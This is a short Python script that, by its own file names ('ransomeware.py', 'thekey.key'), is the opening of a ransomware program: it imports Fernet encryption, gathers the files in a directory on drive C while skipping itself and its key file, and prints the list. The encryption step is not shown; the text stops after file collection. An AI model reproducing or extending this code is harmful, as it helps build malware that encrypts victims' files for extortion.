import os
from cryptography.fernet import Fernet
files=[]

for file in os.listdir('c:'):
    if file == "ransomeware.py" or file == "thekey.key" :
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)